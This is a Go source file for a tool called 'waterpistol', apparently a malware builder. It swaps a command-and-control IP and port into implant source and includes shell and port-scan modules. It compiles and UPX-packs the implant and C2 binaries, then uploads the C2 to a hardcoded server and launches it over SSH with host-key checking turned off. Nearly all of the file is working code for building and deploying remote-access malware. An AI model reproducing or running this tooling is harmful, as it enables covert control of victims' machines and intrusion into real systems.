package main

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

const (
	cert_gen_command = "openssl req -new -newkey rsa:4096 -x509 -sha256 -nodes -out %s/cert.crt -keyout %s/key.key"
)

// Contains current options/c2ip/modules
type waterpistol struct {
	srcdir  string
	srcid   string
	ip      string
	port    int
	modules []string
}

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

func (waterpistol *waterpistol) preprocess_file(data []byte) []byte {
	sdata := string(data)

	// Replace imports
	sdata = strings.Replace(sdata, "malware/", waterpistol.srcid+"/", -1)

	sdata = strings.Replace(sdata, "_C2_IP_", waterpistol.ip, -1)
	sdata = strings.Replace(sdata, "_C2_PORT_", strconv.Itoa(waterpistol.port), -1)

	modules_create := ""
	modules_import := ""
	for _, module := range waterpistol.modules {
		modules_create += module + ".Create(),\n"
		modules_import += "\"" + waterpistol.srcid + "/implant/" + module + "\"\n"
	}
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)

	return []byte(sdata)
}

func (waterpistol *waterpistol) visit(path string, f os.FileInfo, err error) error {
	newpath := waterpistol.srcdir + "/" + path
	if f.IsDir() {
		os.MkdirAll(newpath, os.ModePerm)
	} else {
		input, err := ioutil.ReadFile(path)
		checkError(err)

		data := waterpistol.preprocess_file(input)

		err = ioutil.WriteFile(newpath, data, 0644)
		checkError(err)
	}

	return nil
}

func (waterpistol *waterpistol) generateCerts() error {
	cert_cmd := fmt.Sprintf(cert_gen_command, waterpistol.srcdir, waterpistol.srcdir)
	args := strings.Split(cert_cmd, " ")
	cmd := exec.Command(args[0], args[1:]...)
	cmd.Stdin = strings.NewReader("\n\n\n\n\n\n\n")
	if out, err := cmd.CombinedOutput(); err != nil {
		fmt.Println(string(out))
	}
	return err
}

func (waterpistol *waterpistol) compile(program string) (string, error) {
	tmpfile, err := ioutil.TempFile("", "tmp")
	checkError(err)

	out, err := exec.Command("go", "build", "-o", tmpfile.Name(), "-ldflags", "-s -w", program).CombinedOutput()

	if err != nil {
		fmt.Println(string(out))
	}

	out, err = exec.Command("upx", tmpfile.Name()).CombinedOutput()

	if err != nil {
		fmt.Println(string(out))
	}

	return tmpfile.Name(), err
}

// Gen ssh keys + ec2 ip
func (waterpistol *waterpistol) genereate_c2_ip() (string, string) {
	return "128.199.226.126", "/home/adam/.ssh/id_rsa"
}

func (waterpistol *waterpistol) uploadC2(loc string, priv_key string) error {
	cmd := exec.Command("scp", loc, "root@"+waterpistol.ip+":~/c2")

	fmt.Println("Uploading c2")
	if err := cmd.Run(); err != nil {
		return err
	}

	cmd = exec.Command("scp", waterpistol.srcdir+"/cert.crt", "root@"+waterpistol.ip+":~/crt.crt")
	if err := cmd.Run(); err != nil {
		return err
	}
	cmd = exec.Command("scp", waterpistol.srcdir+"/key.key", "root@"+waterpistol.ip+":~/key.key")
	if err := cmd.Run(); err != nil {
		return err
	}
	fmt.Println("Crts uploaded")

	buffer, err := ioutil.ReadFile(priv_key)
	if err != nil {
		return err
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return err
	}

	sshConfig := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{ssh.PublicKeys(key)},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	fmt.Println("Connecting to c2 ssh")
	connection, err := ssh.Dial("tcp", waterpistol.ip+":22", sshConfig)
	if err != nil {
		return err
	}

	session, err := connection.NewSession()
	if err != nil {
		return err
	}

	fmt.Println("Running c2")

	err = session.Run("screen -d -m -S c2 ./c2 crt.crt key.key")
	if err != nil {
		return err
	}

	return nil
}

func (waterpistol *waterpistol) compile_c2_implant() {
	// Generate cert/key
	// Generate IP for c2
	// Copy source to /tmp dir
	// Preprocess %keys%, %options%
	// build and copy binaries somewhere
	// Upload and run c2 binary

	// Create temp dir
	tmpdir, err := ioutil.TempDir(os.Getenv("GOPATH"), "src/waterpistol")
	id := strings.Split(tmpdir, "src/")[1]

	checkError(err)

	log.Println("Tmp dir created", tmpdir)
	defer os.RemoveAll(tmpdir)

	waterpistol.srcdir = tmpdir
	waterpistol.srcid = id

	// Genereate ec2
	c2_ip, c2_priv_key_file := waterpistol.genereate_c2_ip()
	waterpistol.ip = c2_ip
	waterpistol.port = (rand.Int() % 10000) + 5000 // Port between 5->35000

	// Copy source for implant and c2
	checkError(filepath.Walk("implant", waterpistol.visit))
	checkError(filepath.Walk("c2", waterpistol.visit))
	checkError(filepath.Walk("common", waterpistol.visit))

	log.Println("Source copied")

	checkError(waterpistol.generateCerts())
	log.Println("Certs generated")

	implant, err := waterpistol.compile(id + "/implant")
	checkError(err)
	log.Println("Binary implant: ", implant)

	c2, err := waterpistol.compile(id + "/c2")
	checkError(err)
	log.Println("Binary c2: ", c2)

	checkError(waterpistol.uploadC2(c2, c2_priv_key_file))

}

func checkProgram() {
	// Ensure GO is installed and GOPATH is set
	cmd := exec.Command("go", "version")
	if cmd.Run() != nil {
		fmt.Println("Please make sure Go compiler is installed")
		os.Exit(1)
	}
	if len(os.Getenv("GOPATH")) == 0 {
		fmt.Println("Please make sure ENV GOPATH is set")
		os.Exit(1)
	}

	// Check we are in the go directory
	if ex, err := os.Executable(); err != nil && strings.Contains(path.Dir(ex), os.Getenv("GOPATH")) {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}

	// Check that implant/common/c2 exist
	cmd = exec.Command("ls")
	out, _ := cmd.CombinedOutput()
	outp := string(out)
	if !strings.Contains(outp, "common") ||
		!strings.Contains(outp, "c2") ||
		!strings.Contains(outp, "implant") {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}
}

func main() {
	checkProgram()
	rand.Seed(time.Now().UTC().UnixNano())

	waterpistol := &waterpistol{modules: []string{"sh", "portscan"}}
	waterpistol.compile_c2_implant()
}
